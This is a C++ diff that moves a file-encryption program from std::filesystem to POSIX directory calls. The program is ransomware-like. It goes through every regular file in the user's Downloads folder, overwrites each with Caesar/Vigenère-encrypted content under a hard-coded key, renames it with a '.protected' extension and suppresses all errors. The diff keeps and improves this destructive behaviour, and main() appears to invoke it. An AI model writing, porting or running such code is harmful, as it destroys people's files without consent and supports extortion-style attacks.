@@ -1,9 +1,8 @@
-#include <filesystem>
+#include <dirent.h>
+#include <sys/stat.h>
 #include <fstream>
 #include <string>
 #include <vector>
-
-namespace fs = std::filesystem;
 
 // Caesar cipher encryption
 char caesarEncrypt(char c, int shift) {
@@ -50,20 +49,24 @@ std::string encryptContent(const std::string& content, const std::string& vigene
 
 // Encrypt all files in the Downloads directory
 void encryptFilesInDownloads() {
-    std::string userProfile = std::getenv("USERPROFILE");
-    fs::path downloadsPath = userProfile + "\\Downloads";
+    const char* userProfile = std::getenv("USERPROFILE");
+    if (!userProfile) return;
 
-    if (!fs::exists(downloadsPath) || !fs::is_directory(downloadsPath)) {
-        return;
-    }
+    std::string downloadsPath = std::string(userProfile) + "\\Downloads";
+    DIR* dir = opendir(downloadsPath.c_str());
+    if (!dir) return;
 
     std::string vigenereKey = "magicspell";
 
-    for (const auto& entry : fs::directory_iterator(downloadsPath)) {
-        if (entry.is_regular_file()) {
+    struct dirent* entry;
+    while ((entry = readdir(dir)) != nullptr) {
+        std::string filePath = downloadsPath + "\\" + entry->d_name;
+
+        struct stat fileStat;
+        if (stat(filePath.c_str(), &fileStat) == 0 && S_ISREG(fileStat.st_mode)) {
             try {
                 // Read file content
-                std::ifstream inputFile(entry.path(), std::ios::binary);
+                std::ifstream inputFile(filePath, std::ios::binary);
                 std::ostringstream buffer;
                 buffer << inputFile.rdbuf();
                 std::string content = buffer.str();
@@ -73,18 +76,20 @@ void encryptFilesInDownloads() {
                 std::string encryptedContent = encryptContent(content, vigenereKey);
 
                 // Write encrypted content to the same file
-                std::ofstream outputFile(entry.path(), std::ios::binary);
+                std::ofstream outputFile(filePath, std::ios::binary);
                 outputFile << encryptedContent;
                 outputFile.close();
 
                 // Rename the file
-                fs::rename(entry.path(), entry.path().string() + ".protected");
+                std::string newFilePath = filePath + ".protected";
+                rename(filePath.c_str(), newFilePath.c_str());
 
             } catch (const std::exception&) {
                 // Suppress all exceptions
             }
         }
     }
+    closedir(dir);
 }
 
 int main() {
